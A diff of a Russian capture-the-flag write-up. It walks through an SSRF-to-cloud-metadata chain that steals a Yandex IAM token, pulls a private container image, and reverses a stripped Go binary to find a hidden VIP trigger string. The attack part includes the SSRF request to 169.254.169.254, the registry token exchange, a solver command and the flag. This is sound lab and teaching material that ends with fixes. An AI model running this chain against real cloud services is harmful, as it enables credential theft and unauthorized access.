@@ -1,175 +1,182 @@
-# МёдХантер — золотая звезда «Рекомендованный» (task19) — разбор
+# МёдХантер: VIP status — технический разбор
 
 **Флаг:** `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`
-**Класс:** web / reverse (SSRF → реестр образов → разбор бинарника) · **Сложность:** неизвестно · **Очки:** неизвестно · **Решило команд:** неизвестно
-**Автор:** неизвестно
 
-## В двух словах (без терминов)
+**Класс:** web / cloud / SSRF / IAM credential theft / OCI image extraction / Go reverse engineering
 
-На том же сайте с резюме некоторые анкеты помечены золотой звездой «Рекомендованный кандидат». В интерфейсе такой галочки нет — значит, звезду ставит сервер по какому-то тайному правилу. Задача — узнать это правило и зажечь звезду себе.
+## Краткое техническое резюме
 
-Угадать правило не выходит: сервер его нигде не показывает. Поэтому мы достаём **сам исходный сервер** — точнее, его собранную программу. Помогает та же дыра, что в task18: через неё мы получаем «облачный пропуск», им скачиваем **закрытый образ приложения** из приватного склада и распаковываем. Внутри — программа на языке Go со стёртыми подписями функций, но по одной служебной табличке, которую Go **не может** стереть, мы восстанавливаем, где какая функция, и читаем нужную. Правило оказывается смешным: звезда ставится, если в поле «опыт работы» встречается **секретная строка** — и эту строку сервер тут же **вырезает** из текста, чтобы её никто не увидел. Эта строка и есть флаг: вписываем её в опыт — звезда загорается.
+VIP status резюме вычисляется server-side и не раскрывается frontend. Reflected SSRF из task18
+обращается к AWS-compatible IMDS path и извлекает Yandex IAM token service account. Token
+обменивается на bearer для приватного Container Registry, после чего через Registry v2 API
+скачивается OCI image `hrportal-backend`.
 
----
+После корректного применения OCI layers и whiteouts в rootfs обнаруживается stripped Go binary
+`/app/hrportal-api`. `.gopclntab` восстанавливает имя и boundaries функции
+`(*SeekerService).SaveResume`. Disassembly показывает, что `is_vip` устанавливается при наличии
+flag string в `experience`, после чего строка удаляется перед сохранением.
 
-## 1. Что за задача
+## 1. Контекст и цель
 
-Портал `https://hrportal-aoa51cvc.avitoctf.ru/` (тот же HRPortal, что в task18/task21). По условию (`task.md`) некоторые резюме получают золотую отметку **«Рекомендованный кандидат»**, хотя в интерфейсе нет ни переключателя, ни поля для неё. Нужно понять, **какой именно опыт работы** (компания? должность? навык? магическое значение?) включает эту отметку, самому создать резюме с таким опытом и получить звезду — значение триггера и есть флаг `avito{...}`.
+Target: `https://hrportal-aoa51cvc.avitoctf.ru/`.
 
-Это вторая из трёх задач «МёдХантер»: точка входа та же SSRF, что и в [task18](../task18/hrportal_task18_writeup.md), но здесь дыру раскручивают дальше — не до `.env`, а до «облачного пропуска» и приватного реестра образов.
+Необходимо получить `is_vip: true` для собственного resume. Frontend не предоставляет field или
+operation для изменения VIP status. Из task18 доступны:
 
-## 2. Разведка — что мы увидели
+- reflected SSRF в `POST /api/seeker/resume/import`;
+- `REGISTRY_ID=crpml40t8ia2kptf4iv7` из cloud-init `.env`;
+- доступ к AWS-compatible paths `yc-imdsv1-bridge`.
 
-- `index_response.txt` / `bundle.js` / `bundle.pretty.js`: тот же React-фронтенд, что в task18/task21.
-- Фронтенд **вообще не рисует** поле `is_vip` нигде — ни в карточке резюме, ни в форме редактирования. Значит, восстановить правило из клиентского кода нельзя: искать в JS бессмысленно.
-- В `resumes_list.json` есть сид-резюме `id=2` («Клавдия Когтева», Backend-разработчик) с `is_vip: true` прямо в исходных данных — единственная VIP-запись среди сидов. `resume_2.json` показывает её опыт: `"2019–2024 — Go-разработчик, БерлогаСофт. Микросервисы, PostgreSQL, Docker."` — обычный текст, ничего внешне особенного.
-- Из task18 у нас уже есть SSRF-примитив (`POST /api/seeker/resume/import` с `url` на `169.254.169.254`) и утёкший `.env` с `REGISTRY_ID=crpml40t8ia2kptf4iv7` — готовый плацдарм, чтобы продолжить цепочку в сторону реестра образов.
+Связанный SSRF analysis: [`../task18/hrportal_task18_writeup.md`](../task18/hrportal_task18_writeup.md).
 
-> Мини-словарь. **`is_vip`** — внутреннее поле «этот кандидат рекомендованный». **Сид-данные (seed)** — записи, которыми базу наполнили при запуске, «для примера». **SSRF** — заставить сервер сходить по нужному тебе адресу (подробно в разборе task18). **Реестр образов (registry)** — «склад» готовых собранных приложений (образов), откуда их берут для запуска. **`REGISTRY_ID`** — адрес нашего конкретного склада.
+## 2. Reconnaissance и attack surface
 
-## 3. Как мы дошли до решения (главный раздел)
+React bundle не содержит VIP decision logic. `resumes_list.json` включает seed record `id=2` с
+`is_vip: true`, однако копирование его `experience` не изменяет status другого resume. Следовательно,
+seed value установлен независимо от production `SaveResume` path.
 
-- **Наблюдение.** `is_vip` нигде не выводится клиентом, но одно сид-резюме уже помечено VIP, и его опыт выглядит как обычный, не пустой текст.
-- **Гипотеза №1 (тупик).** Раз единственная VIP-запись видна целиком, самое дешёвое предположение — «скопировать её опыт слово в слово к себе, сервер сравнит по тексту и поставит звезду».
-- **Проверка.** Создали/обновили своё резюме с `experience`, идентичным `resume_2.json` (`"2019–2024 — Go-разработчик, БерлогаСофт. Микросервисы, PostgreSQL, Docker."`).
-- **Результат.** `is_vip` осталось `false`. Тупик: сид-VIP-резюме №2 — это **приманка** (данные, выставленные напрямую в базу при инициализации), её видимый текст не имеет отношения к настоящему правилу.
-- **Вывод из тупика.** Раз ни фронтенд, ни единственный видимый пример не дают зацепки, угадать условие из самого приложения невозможно — оно решается где-то на сервере и наружу не выводится ни в одном ответе. Значит, единственный путь — **прочитать сам код бэкенда**, а не тыкать в чёрный ящик.
-- **Гипотеза №2.** У нас уже есть рабочая SSRF из task18. IMDS отдал `.env` с публичными реквизитами облака (в т.ч. `REGISTRY_ID`) — если тот же мост отдаёт ещё и «облачный пропуск» сервис-аккаунта, им можно дотянуться до приватного реестра и вытащить сам образ бэкенда.
-- **Проверка.** `POST /api/seeker/resume/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}` — путь метадаты в AWS-стиле (в отличие от Google-стиля, который требует спец-заголовок, а его SSRF не проставит).
-- **Результат.** Мост отдал настоящий Yandex IAM-токен без заголовка (`iam_token.txt`) — та же дыра SSRF→IMDS, но со следствием сильнее, чем в task18.
+IMDS endpoint для service account credentials:
 
-> Мини-словарь. **IMDS / метадата** — внутренний адрес `169.254.169.254`, где облачная машина хранит свои настройки и временные пропуска. **IAM-токен** — временный «облачный пропуск» сервис-аккаунта: показал его облаку — и тебе разрешают действия от имени этой учётки.
-
-- **Гипотеза №3.** IAM-токен обменивается на «пропуск реестра» через стандартный эндпоинт `cr.yandex/v2/token/`, а сам реестр (Registry v2) — это обычный HTTP-API. Значит, образ можно скачать простым `curl`, без установки Docker (слои отдаются редиректом на хранилище).
-- **Проверка.** Обменяли токен, получили `reg_bearer.txt`, дёрнули `manifest.json` и все слои `blobs/sha256:...` по `REGISTRY_ID` из task18.
-- **Результат.** Получили 4 слоя файловой системы образа `hrportal-backend`; внутри — Go-бинарник `/app/hrportal-api`.
-
-> Мини-словарь. **Registry v2 / манифест** — способ хранить и отдавать образы по обычному HTTP; манифест — это «оглавление» образа со списком слоёв. **Слой (layer)** — кусок файловой системы образа; слои накладываются друг на друга. **Бинарник** — собранная (скомпилированная) программа в машинном коде.
-
-- **Наблюдение.** Бинарник собран на Go со **срезанными символами** (обычные `file`/`nm` не дают осмысленных имён функций) — казалось, что дизассемблировать нужную функцию вслепую по всему бинарю очень долго.
-
-> Мини-словарь. **Символы** — «подписи» в программе: имена функций и переменных. **`strip`** — их срезают, чтобы затруднить чтение чужого кода. **Дизассемблировать** — превратить машинный код обратно в понятные человеку инструкции процессора.
-
-- **Гипотеза №4.** Go-рантайму служебная таблица `.gopclntab` нужна для собственных нужд (паники, трейсы, `runtime.Caller`) даже в полностью «застриппенной» сборке — значит, физически её вырезать нельзя, и по ней можно восстановить имена и границы **всех** функций через `debug/gosym`, не трогая остальной дизасм.
-
-> Мини-словарь. **`.gopclntab`** — служебная табличка внутри Go-программы, сопоставляющая куски машинного кода с именами функций; Go держит её всегда, чтобы уметь печатать понятные ошибки-паники. Её наличие и выдаёт всю карту функций.
-
-- **Проверка.** Написали `pcln.go` — маленький Go-инструмент: открывает ELF, находит секцию `.gopclntab`, строит `gosym.Table` и печатает `(имя, начало, конец)` для функций, чьё имя подходит под шаблон.
-- **Результат.** Гипотеза подтвердилась: нашли `hrportal/internal/application.(*SeekerService).SaveResume` с точными границами, дизассемблировали именно её в radare2 (`save_resume.asm`) — не весь бинарник.
-- **Финальная находка (в дизасме).** В `SaveResume` увидели сравнение указателя на константу в `.rodata` длиной 38 байт (ровно длина `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`) с полем `experience` через `strings.Index`/`setge` (то есть `Contains`), и сразу за ним — `strings.Replace(experience, FLAG, "", -1)` перед сохранением. Это объясняет и первый тупик (гипотеза №1 не могла сработать — у `resume_2` в тексте нет этой подстроки), и почему звезду нельзя было увидеть по API (подстрока вырезается ещё до сохранения, то есть до того, как объект попадёт в ответ).
-- **Проверка вживую.** `PUT /api/seeker/resume` с `experience`, содержащим `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}` → ответ `"is_vip": true`, а в сохранённом `experience` подстроки уже нет — оба предсказания дизасма подтвердились.
-
-**Бытовая аналогия «сердцевины».** Представь придирчивого кадровика, который ставит золотую звезду, только если в резюме встретится **тайный пароль**, известный лишь ему. А чтобы никто не подсмотрел этот пароль в анкете, он, поставив звезду, **аккуратно замазывает пароль штрихом** — в подшитой копии его уже не видно. Снаружи всё выглядит загадкой: звезда есть, а за что — непонятно, в тексте пусто. Разгадка появляется только когда мы достаём **служебную инструкцию самого кадровика** (программу сервера) и читаем в ней этот пароль.
-
-## 4. В чём именно ошибка (суть уязвимости)
-
-Два независимых слоя, оба нужны для решения:
-
-1. **SSRF → IMDSv1-мост без ограничений → IAM-пропуск.** `POST /api/seeker/resume/import` делает исходящий запрос по произвольному `url` без «белого списка» и без блокировки `169.254.169.254`; путь метадаты в AWS-стиле (`/latest/meta-data/iam/security-credentials/default`) не требует заголовка (в отличие от Google-стиля), поэтому одной SSRF достаточно, чтобы вытащить наружу IAM-токен сервис-аккаунта. Тот же баг, что в task18, но раскрученный до реального доступа к облаку, а не только к `.env`.
-2. **Недокументированная бизнес-логика + «обфускация через анти-тампер».** `SeekerService.SaveResume` (Go, `hrportal-backend`) ставит `is_vip=true`, если `experience` содержит зашитую в `.rodata` строку-флаг, и сразу вырезает эту подстроку из сохраняемого текста. По сути это секрет, вшитый прямо в бинарник приватного (но недостаточно защищённого от кражи) образа — «security through obscurity», которая рушится, как только образ становится доступен для скачивания и реверса.
-
-> Мини-словарь. **`.rodata`** — область программы с константами «только для чтения»; туда и вшита строка-флаг. **Анти-тампер** — «защита от подделки»: здесь сервер вырезает строку-триггер, чтобы её нельзя было подсмотреть в сохранённых данных. **Security through obscurity** — «защита через непонятность»: секрет прячут, а не по-настоящему запирают; ломается, как только его найдут.
-
-## 5. Эксплойт по шагам
-
-### Шаг 1. SSRF → IAM-токен
-```
-POST /api/seeker/resume/import
-{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}
-→ Yandex IAM-токен  t1.9euel...   (сохранён в task19/iam_token.txt)
+```text
+http://169.254.169.254/latest/meta-data/iam/security-credentials/default
 ```
 
-### Шаг 2. IAM-токен → «пропуск» приватного реестра
+Reflected response содержит Yandex IAM token. Registry authorization endpoint принимает этот token
+для scope:
+
+```text
+repository:crpml40t8ia2kptf4iv7/hrportal-backend:pull
 ```
+
+Registry v2 возвращает OCI index или image manifest и content-addressed blobs. Image состоит из
+четырёх filesystem layers; application binary расположен в `/app/hrportal-api`.
+
+## 3. Анализ и проверка гипотез
+
+Registry bearer запрашивается следующим образом:
+
+```http
 GET https://cr.yandex/v2/token/?scope=repository:<REGISTRY_ID>/hrportal-backend:pull
-Authorization: Basic base64("iam:" + <IAM_TOKEN>)
-→ registry bearer  (сохранён в task19/reg_bearer.txt)
+Authorization: Basic base64("iam:" + IAM_TOKEN)
 ```
-`REGISTRY_ID=crpml40t8ia2kptf4iv7` — из `.env`, утёкшего в task18.
 
-### Шаг 3. Скачать образ по Registry v2 (без Docker-демона)
-```
-GET /v2/<REGISTRY_ID>/hrportal-backend/manifests/latest   (Accept: .../manifest.v2+json)
-→ manifest.json (4 слоя)
-GET /v2/<REGISTRY_ID>/hrportal-backend/blobs/sha256:<layer-digest>   (-L для редиректа на хранилище)
-```
-Распаковали слои (`layers/`, `rootfs/`) → нашли `/app/hrportal-api`.
+После получения bearer solver разрешает OCI index, выбирает platform manifest, скачивает layer
+blobs и последовательно применяет их. Реализация учитывает `.wh.<name>` и opaque whiteout
+`.wh..wh..opq`, а также отклоняет path traversal и absolute paths.
 
-### Шаг 4. Восстановить карту функций «застриппенного» Go-бинарника
+ELF stripped для стандартной symbol table, но Go runtime metadata `.gopclntab` сохраняет function
+names и PC ranges. Инструмент `pcln.go` использует `debug/gosym`:
+
 ```bash
-go run pcln.go rootfs/app/hrportal-api SaveResume
+go run task19/pcln.go task19/rootfs-rebuilt/app/hrportal-api SaveResume
 ```
-даёт точные `(начало, конец)` для `hrportal/internal/application.(*SeekerService).SaveResume` — дальше дизассемблировали именно её в radare2 (`save_resume.asm`), не весь бинарник.
 
-### Шаг 5. Прочитать условие в дизасме
-Ключевые инструкции из `save_resume.asm`:
-```
-0x006d7076  mov rcx, [0x010610f0]  ; str.avitogOLd3N_w0rk_eXp3RIEnc3_d37EctED
-0x006d70be  mov rdi, [0x010610f8]  ; = 38  (длина avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED})
-0x006d7083  call 0x40cb80          ; strings.Index(experience, FLAG)
-0x006d708b  setge dl                ; dl = 1, если index >= 0  ->  Contains
-0x006d70d7  call 0x5057a0          ; strings.Replace(experience, FLAG, "", -1)  -- вырезает флаг
-0x...       mov byte [rax+0x89], cl ; is_vip = dl,  затем repo.Upsert
-```
-Итого: `is_vip = strings.Contains(experience, "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}")`, и сама подстрока стирается из сохранённого текста.
+Результат содержит:
 
-### Шаг 6. Подтвердить вживую
+```text
+hrportal/internal/application.(*SeekerService).SaveResume
 ```
-PUT /api/seeker/resume        (seeker-кука, cookies.txt/creds.txt)
-{"experience":"... avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}", ...}
-→ "is_vip": true   (в сохранённом experience подстрока уже вырезана)
-```
-Звезда «Рекомендованный» загорелась — это и есть флаг.
 
-Вся цепочка шагов 1–3, безопасное наложение OCI-слоёв, поиск флага/ключа очереди в восстановленном
-rootfs и шаг 6 собраны в одном entry point:
+Targeted disassembly в `save_resume.asm` показывает `strings.Index` для flag constant длиной 38
+bytes, преобразование результата в boolean и последующий `strings.Replace(..., FLAG, "", -1)`.
+Эквивалентная логика:
+
+```go
+resume.IsVIP = strings.Contains(resume.Experience,
+    "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}")
+resume.Experience = strings.ReplaceAll(resume.Experience,
+    "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}", "")
+```
+
+Удаление trigger до persistence объясняет, почему он не отображается в последующих API responses.
+
+## 4. Корневая причина
+
+1. SSRF предоставляет read access к IMDS и извлекает workload IAM credentials.
+2. Service account имеет pull permission к production Container Registry.
+3. Application image содержит security-sensitive business trigger как plaintext constant.
+4. Удаление trigger из persisted data является obfuscation, а не access control.
+5. Private image ошибочно рассматривается как boundary для защиты embedded secrets и logic.
+
+Strip symbols не предотвращает reverse engineering Go binaries: runtime metadata, string constants
+и control flow остаются доступными.
+
+## 5. Эксплуатация
+
+Извлечение IAM token через SSRF:
+
+```http
+POST /api/seeker/resume/import
+Content-Type: application/json
+
+{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}
+```
+
+Registry operations:
+
+```text
+GET /v2/<REGISTRY_ID>/hrportal-backend/manifests/latest
+GET /v2/<REGISTRY_ID>/hrportal-backend/blobs/sha256:<digest>
+```
+
+Подтверждение business trigger:
+
+```http
+PUT /api/seeker/resume
+Content-Type: application/json
+
+{"experience":"... avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED} ..."}
+```
+
+Response содержит `"is_vip":true`, а сохранённое `experience` больше не содержит trigger.
+
+End-to-end solver:
 
 ```bash
 uv run python task19/solve_task19.py \
-  --registry-id <REGISTRY_ID-из-task18> \
+  --registry-id crpml40t8ia2kptf4iv7 \
   --cookie-file <cookies.txt> \
   --apply-vip
 ```
 
-Вместо seeker-куки для первых пяти шагов можно передать уже полученный `--iam-token`. Каталог
-`task19/rootfs-rebuilt/` создаётся заново и намеренно игнорируется git.
-Для свежего seeker-аккаунта этого достаточно; если на нём уже включена PDF-бета и сервер требует
-капчу при сохранении, solver принимает свежий браузерный токен через `--recaptcha-token`.
+Вместо SSRF stage можно передать `--iam-token`. Если resume update требует reCAPTCHA, используется
+`--recaptcha-token`. Rootfs пересобирается в `task19/rootfs-rebuilt/`.
 
-### Бонус (мостик к task21)
-Рядом с флаг-константой в том же бинарнике нашлись ещё две строки, нужные в task21:
-`mhq_v1_<32 hex>` (`RENDER_QUEUE_SIGNING_KEY`, ключ подписи очереди рендера) и `incoming/` (префикс,
-на который срабатывает рендер-воркер) — проверяются через `grep -a "mhq_v1_" rootfs/app/hrportal-api`
-и `grep -a "incoming/" rootfs/app/hrportal-api`. Само значение ключа в git не сохраняется. Ключами S3,
-утёкшими в task18 и переданными через `STORAGE_ACCESS_KEY`/`STORAGE_SECRET_KEY`, бакет
-`medhunter-resumes-6d6c314a` листится и читается напрямую выверенным скриптом `s3get.py` (см. §8).
+Локальная проверка OCI extraction, whiteouts и path validation:
+
+```bash
+uv run python task19/solve_task19.py --self-test
+```
+
+Binary также содержит `RENDER_QUEUE_SIGNING_KEY` формата `mhq_v1_<32 hex>` и prefix `incoming/`,
+используемые в task21.
 
 ## 6. Флаг
 
-```
+```text
 avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}
 ```
 
-## 7. Мораль — какой это урок
+## 7. Выводы и рекомендации
 
-1. **Когда триггер фичи нигде не выводится — угадывать бессмысленно, реверсь бэкенд.** Единственный видимый VIP-пример (сид-резюме №2) оказался приманкой, не связанной с реальным правилом; это стоило одной проверенной и отброшенной гипотезы, но сразу показало, что решения в клиенте нет. Урок: если чёрный ящик молчит — не подбирай к нему пароли, а вскрой сам ящик.
-2. **`.gopclntab` переживает `strip` в Go-бинарях**, потому что нужен самому рантайму (паники/трейсы). Это надёжный способ восстановить имена и границы функций и дизассемблировать **прицельно**, а не читать весь бинарник вслепую. Практикам это экономит часы; защитникам — напоминание, что «мы же застриппили символы» не прячет логику Go-программы.
-3. **Секрет, вшитый в бинарник, + вырезание строки-триггера — это не защита, а обфускация.** Как только приватный образ становится скачиваемым (через SSRF-цепочку из task18/task19), любая логика внутри читается напрямую в дизасме. **Как надо:** не хранить секреты-триггеры в коде; не полагаться на то, что «образ приватный» — приватность образа держится на облачных пропусках, а те, как мы видели, утекают одной SSRF.
+- Закрыть SSRF к IMDS с помощью destination validation, egress policy и token-based metadata
+  protocol.
+- Назначать workload identity минимальные IAM permissions; frontend backend не должен иметь pull
+  access к unrelated production images.
+- Не размещать secrets и authorization triggers в application binaries.
+- Реализовать VIP assignment через explicit authorization policy и server-managed state, а не
+  hidden input token.
+- Считать private registry частью supply-chain infrastructure, а не механизмом сокрытия logic.
+- Сканировать images на embedded credentials, internal endpoints и sensitive constants.
 
-## 8. Файлы в папке
+## 8. Файлы для воспроизведения
 
-- `solve_task19.py` — основной end-to-end solver: SSRF→IAM, обмен на Registry bearer, разрешение
-  OCI index/manifest, скачивание и безопасное наложение слоёв с whiteout-семантикой, поиск
-  `avito{...}`/`mhq_v1_...` и опциональное подтверждение VIP. Self-test:
-  `uv run python task19/solve_task19.py --self-test`.
-- `s3get.py` — выверенный скрипт: самодостаточный SigV4-клиент для Yandex Object Storage (`list-type=2` + скачивание объектов) поверх реквизитов, утёкших в task18; воспроизводит доступ к бакету `medhunter-resumes-6d6c314a` из бонус-находок §5.
-- `pcln.go` — восстановление карты функций «застриппенного» Go-бинарника по `.gopclntab` (`debug/gosym`).
-- `save_resume.asm` — дизасм функции `SaveResume` (radare2), где найдено условие звезды.
-- `manifest.json`, `layers/`, `rootfs/` — крупные генерируемые артефакты образа, поэтому не коммитятся.
-  `solve_task19.py` пересоздаёт rootfs из чистого checkout; `pcln.go` и сохранённый `save_resume.asm`
-  документируют более прицельный путь реверса через `.gopclntab`.
-- `iam_token.txt`, `reg_bearer.txt` — промежуточные токены цепочки SSRF→IMDS→реестр (эфемерны, могли не сохраниться).
-- `resumes_list.json`, `resume_2.json` — сид-данные, на которых проверили и отбросили тупиковый вариант «скопировать текст VIP-резюме».
-- `cookies.txt` / `creds.txt` — seeker-сессия, которой подтверждали присвоение звезды.
+Version-controlled artifacts:
 
-Начало цепочки (та же SSRF, но до `.env`) — [`../task18/hrportal_task18_writeup.md`](../task18/hrportal_task18_writeup.md).
+- `task19/solve_task19.py` — SSRF → IAM → registry bearer → OCI extraction → trigger discovery →
+  optional VIP update.
+- `task19/s3get.py` — SigV4 Object Storage client, используемый следующей частью цепочки.
+- Продолжение цепочки: [`../task21/hrportal_task21_writeup.md`](../task21/hrportal_task21_writeup.md).
+
+Disassembly, manifests, API fixtures, OCI layers и rebuilt rootfs являются generated analysis artifacts
+и не входят в version-controlled набор.
